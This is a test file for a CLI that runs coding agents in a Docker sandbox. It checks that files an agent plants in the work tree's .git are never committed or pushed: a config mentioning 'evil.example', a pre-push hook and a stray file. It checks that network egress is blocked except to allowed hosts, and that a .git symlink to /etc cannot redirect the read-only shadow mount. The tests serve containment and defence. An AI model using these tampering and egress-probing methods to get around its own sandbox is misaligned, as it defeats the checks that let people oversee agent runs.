		// What the agent planted inside the work tree's .git is in the pushed tree, too: never.
		assert.deepEqual(git(["--git-dir", bare, "ls-tree", "-r", "--name-only", `refs/heads/submissions/${head}`]).stdout.trim().split("\n").sort(),
			["money.ts", "src.ts"]);
		// The planted work-tree config and hook are exactly where the agent left them: run never read
		// or wrote them, and its git always named the state git directory explicitly.
		assert.equal(readFileSync(join(work, ".git", "config"), "utf8").includes("evil.example"), true);
		assert.equal(existsSync(join(work, ".git", "hooks", "pre-push")), true);
		for (const call of calls.filter(call => call.args.some(arg => arg.includes("submissions/") || arg === "push"))) {
			assert.equal(call.args.includes("--git-dir"), true, call.args.join(" "));
			assert.equal(call.args.includes(stateDir), true, call.args.join(" "));
		}
		assert.equal(printed.join("\n").includes("Changed files: src.ts (1 line)"), true, printed.join("\n"));
	} finally { rmSync(root, { recursive: true, force: true }); }
});

test("a file written into the work tree .git by the agent is never committed or counted", () => {
	const root = mkdtempSync(join(tmpdir(), "acquit-run-dotgit-"));
	try {
		const { bare, frozen, git } = workRepoFixture(root);
		const state = stateGitDir("job_7Q2K", { XDG_STATE_HOME: join(root, "state-home") });
		const work = join(root, "work");
		const checkout = { gitDir: state, workTree: work };
		prepareWorkRepo(git, checkout, bare, frozen, process.env);
		// The agent edits the tree and also leaves a file inside the shadow: host git names the
		// state directory instead, and its own `.git` protection keeps the work-tree path out of
		// the add, the count, and the pushed tree.
		writeFileSync(join(work, "money.ts"), "const DECIMALS = 3;\n");
		writeFileSync(join(work, ".git", "planted.txt"), "not content\n");
		const commit = submissionCommit(git, checkout, frozen, "Run job_7Q2K with ts-bugfixer", process.env);
		assert.notEqual(commit, null);
		assert.deepEqual(git(["--git-dir", state, "ls-tree", "-r", "--name-only", commit as string]).stdout.trim().split("\n"), ["money.ts"]);
		assert.deepEqual(changedFiles(git, checkout, frozen, process.env, commit as string), [{ path: "money.ts", added: 1, binary: false }]);
		// The host never removed what the agent wrote there.
		assert.equal(readFileSync(join(work, ".git", "planted.txt"), "utf8"), "not content\n");
	} finally { rmSync(root, { recursive: true, force: true }); }
});

test("run refuses a job the session does not own before it touches git or docker", async () => {
	const docker = fakeDocker();
	const git = fakeGit();
	await assert.rejects(runRun(runOptions({ dir: "/tmp" }), { client: fakeClient({ job: jobView({ lockedTo: "other-ops" }) }),
		provider: keyPort(keyCanary), docker, git, print: () => {} }), (error: CliError) => error.code === "NOT_OWNER");
	assert.equal(docker.calls.length, 0);
	assert.equal(git.calls.length, 0);
});

test("claude-code without a provider key refuses by name and starts nothing", async () => {
	const docker = fakeDocker();
	const git = fakeGit();
	const client = fakeClient();
	await assert.rejects(runRun(runOptions({ dir: "/tmp" }), { client, provider: keyPort(null), docker, git, print: () => {} }),
		(error: CliError) => error.code === "PROVIDER_KEY_MISSING");
	assert.equal(docker.calls.length, 0);
	assert.equal(client.posts.length, 0);
});

test("a command runner whose script is missing refuses by name", async () => {
	const client = fakeClient();
	await assert.rejects(runRun(runOptions({ runner: "command", command: "/nonexistent/acquit-fix.sh" }),
		{ client, provider: keyPort(null), docker: fakeDocker(), git: fakeGit(), print: () => {} }),
		(error: CliError) => error.code === "COMMAND_MISSING");
	assert.equal(client.posts.length, 0);
});

test("run refuses an agent whose stored runner is not one this CLI runs", async () => {
	const job = jobView({ bids: { operators: [{ id: "bid_7Q2K", operator: "devon-ops" as OperatorId, handle: "devon-ops", label: "INDEPENDENT",
		price: 40000, eta: 48, agent: "ts-bugfixer", runner: "codex", pitch: "p", paidReceipts: 0, status: "ACCEPTED" }], house: null } });
	await assert.rejects(runRun(runOptions(), { client: fakeClient({ job }), provider: keyPort(null), docker: fakeDocker(), git: fakeGit(), print: () => {} }),
		(error: CliError) => error.code === "RUNNER_UNSUPPORTED");
});

// ---- live docker smoke (ACQUIT_DOCKER_TEST=1) -------------------------------------------------

test("live docker smoke: egress is limited, the edit is counted, and a planted .git symlink cannot move the shadow",
	{ skip: process.env.ACQUIT_DOCKER_TEST !== "1" }, async () => {
	const image = process.env.ACQUIT_RUNNER_IMAGE ?? "acquit/runner-node20";
	const probe = spawnSync("docker", ["image", "inspect", image, "--format", "{{.Id}}"], { encoding: "utf8", timeout: 30_000 });
	assert.equal(probe.status, 0, `Build the runner image first: docker build -t ${image} packages/runner`);
	const smokeRoot = mkdtempSync(join(tmpdir(), "acquit-run-smoke-"));
	// The production layout: the clone's git directory is outside the work tree the sandbox mounts.
	// `git init` writes the same `gitdir:` link a `--separate-git-dir` clone does.
	const root = join(smokeRoot, "work");
	const state = join(smokeRoot, "state.git");
	const script = join(tmpdir(), `acquit-smoke-${process.pid}.sh`);
	const plantedScript = join(tmpdir(), `acquit-smoke-planted-${process.pid}.sh`);
	try {
		const git = gitCli();
		const at = (args: readonly string[]) => {
			const result = git(["--git-dir", state, "--work-tree", root, ...args]);
			assert.equal(result.status, 0, result.stderr);
			return result.stdout.trim();
		};
		// Exactly the two probes: `ls -A` exits 0 with nothing between the markers (an empty, readable
		// directory), and touch fails with the read-only mount's own error text.
		const assertGitShadow = (captured: string): void => {
			const lines = captured.split("\n").map(line => line.replace(/^(?:stdout|stderr): /, ""));
			const begin = lines.indexOf("GITDIR_LS_BEGIN");
			assert.notEqual(begin, -1, "the shadow probes must run");
			assert.equal(lines[begin + 1], "GITDIR_LS_EXIT 0", "ls -A /work/.git must list an empty directory and exit 0");
			assert.equal(lines[begin + 2], "touch: cannot touch '/work/.git/probe': Read-only file system");
			assert.equal(lines[begin + 3], "GITDIR_TOUCH_EXIT 1");
		};
		assert.equal(git(["init", "--quiet", `--separate-git-dir=${state}`, root]).status, 0);
		at(["config", "user.email", "smoke@example.invalid"]);
		at(["config", "user.name", "smoke"]);
		mkdirSync(join(root, "tests"));
		writeFileSync(join(root, "tests/totals.test.ts"), "it(\"formats\", () => {\n\texpect(1).toBe(1);\n});\n");
		at(["add", "-A"]);
		at(["commit", "--quiet", "-m", "frozen"]);
		const base = at(["rev-parse", "HEAD"]) as CommitSha;
		writeFileSync(script, [
			"#!/bin/sh",
			"printf '\\texpect(2).toBe(2);\\n' >> tests/totals.test.ts",
			// The work tree is bind-mounted at /work, but the job's git directory is never inside it:
			// an empty readable read-only tmpfs covers /work/.git, and the real one stays in the
			// state path. The markers make both outcomes exact: nothing may print between BEGIN and
			// EXIT, and the touch error text is the read-only mount's.
			"echo GITDIR_LS_BEGIN",
			"ls -A /work/.git",
			"echo GITDIR_LS_EXIT $?",
			"touch /work/.git/probe 2>&1; echo GITDIR_TOUCH_EXIT $?",
			"curl -sS --max-time 15 -o /dev/null https://example.com 2>/tmp/acquit-curl.err && echo EGRESS_ALLOWED_EXAMPLE || { echo EGRESS_BLOCKED_EXAMPLE; cat /tmp/acquit-curl.err; }",
			"curl -sS --max-time 30 -o /dev/null -w 'REGISTRY_HTTP %{http_code}\\n' https://registry.npmjs.org/",
			"curl -sS --max-time 15 -o /dev/null https://registry.npmjs.org:81/ 2>/tmp/acquit-curl81.err && echo CONNECT_81_ALLOWED || { echo CONNECT_81_REFUSED; sed 's/^/CURL81: /' /tmp/acquit-curl81.err; }",
			"curl -sS --max-time 15 -x \"$HTTPS_PROXY\" --request-target https://api.anthropic.com/v1/messages -o /tmp/acquit-curlhttps.body -w 'HTTPS_FORWARD %{http_code}\\n' http://api.anthropic.com/; sed 's/^/HTTPSFORWARD: /' /tmp/acquit-curlhttps.body",
			"node -e \"fetch('https://example.com').then(() => console.log('FETCH_ALLOWED_EXAMPLE')).catch(() => console.log('FETCH_BLOCKED_EXAMPLE'))\"",
			"node -e \"fetch('https://registry.npmjs.org/').then(r => console.log('FETCH_REGISTRY', r.status)).catch(e => console.log('FETCH_REGISTRY_FAILED', e.message))\"",
			"",
		].join("\n"), { mode: 0o755 });
		const names = sandboxNames(`smoke_${process.pid}`);
		const plan: RunnerPlan = { names, image, proxyImage: image, dir: root, argv: agentArgv("command", "ignored", "/acquit/command.sh"),
			commandPath: script, runner: "command", provider: "anthropic", providerKey: null, providerModel: null, instruction: null, jobId: `smoke_${process.pid}`,
			uid: process.getuid?.() ?? null, gid: process.getgid?.() ?? null };
		const output: string[] = [];
		const code = await runAgentInSandbox(plan, (await import("../src/run.ts")).dockerCli(),
			(chunk, stream) => output.push(`${stream}: ${chunk}`));
		const text = output.join("");
		console.log(`[smoke] runner exit ${code}\n${text}`);
		assert.equal(code, 0, text);
		assert.match(text, /EGRESS_BLOCKED_EXAMPLE/);
		assert.match(text, /CONNECT tunnel failed, response 403/);
		assert.match(text, /FETCH_BLOCKED_EXAMPLE/);
		assert.match(text, /REGISTRY_HTTP (200|30\d)/);
		assert.match(text, /FETCH_REGISTRY 200/);
		assert.match(text, /CONNECT_81_REFUSED/);
		// curl does not echo the authority it failed to tunnel; the prefixed line is that attempt's own
		// stderr, and a 403 there is the proxy refusing the port before any upstream dial.
		assert.match(text, /CURL81: curl: \(56\) CONNECT tunnel failed, response 403/);
		// A plain forward may carry an absolute-form http URL on port 80 only, so an https absolute-form
		// target is refused instead of forwarded in the clear.
		assert.match(text, /HTTPS_FORWARD 403/);
		assert.match(text, /HTTPSFORWARD: egress denied: api\.anthropic\.com/);
		// The sandbox sees an empty readable read-only shadow over the work tree's own .git, while
		// the checkout's git directory is outside the mount, in the state path.
		assertGitShadow(text);
		// Starting the sandbox replaced the clone's `gitdir:` link with the empty real directory
		// it mounts the tmpfs over.
		assert.equal(lstatSync(join(root, ".git")).isSymbolicLink(), false);
		assert.deepEqual(readdirSync(join(root, ".git")), []);
		assert.deepEqual(changedFiles(git, { gitDir: state, workTree: root }, base, process.env), [{ path: "tests/totals.test.ts", added: 1, binary: false }]);
		// The previous run's agent owns the work tree and can have replaced the shadow with a
		// symlink. A second run must unlink it before the mount: if the tmpfs landed on the link's
		// target inside the container, the container's /etc would be masked empty.
		rmSync(join(root, ".git"), { recursive: true, force: true });
		symlinkSync("/etc", join(root, ".git"));
		writeFileSync(plantedScript, [
			"#!/bin/sh",
			"if [ -r /etc/passwd ]; then echo ETCPASSWD_READABLE; else echo ETCPASSWD_MASKED; fi",
			"echo GITDIR_LS_BEGIN",
			"ls -A /work/.git",
			"echo GITDIR_LS_EXIT $?",
			"touch /work/.git/probe 2>&1; echo GITDIR_TOUCH_EXIT $?",
			"",
		].join("\n"), { mode: 0o755 });
		const plantedOutput: string[] = [];
		const planted = await runAgentInSandbox({ ...plan, commandPath: plantedScript }, (await import("../src/run.ts")).dockerCli(),
			(chunk, stream) => plantedOutput.push(`${stream}: ${chunk}`));
		const plantedText = plantedOutput.join("");
		console.log(`[smoke] planted runner exit ${planted}\n${plantedText}`);
		assert.equal(planted, 0, plantedText);
		assert.match(plantedText, /ETCPASSWD_READABLE/);
		assertGitShadow(plantedText);
		// The link is gone, nothing it named was touched, and the shadow is empty and real.
		assert.equal(lstatSync(join(root, ".git")).isSymbolicLink(), false);
		assert.equal(lstatSync(join(root, ".git")).isDirectory(), true);
		assert.deepEqual(readdirSync(join(root, ".git")), []);
		// The run's own cleanup leaves no container or network behind.
		const containers = spawnSync("docker", ["ps", "-a", "--filter", `name=${names.runner}`, "--format", "{{.Names}}"], { encoding: "utf8" });
		const networks = spawnSync("docker", ["network", "ls", "--filter", `name=${names.runner}`, "--format", "{{.Name}}"], { encoding: "utf8" });
		assert.equal(containers.stdout.trim(), "", containers.stdout);
		assert.equal(networks.stdout.trim(), "", networks.stdout);
	} finally {
		rmSync(script, { force: true });
		rmSync(plantedScript, { force: true });
		rmSync(smokeRoot, { recursive: true, force: true });
	}
});
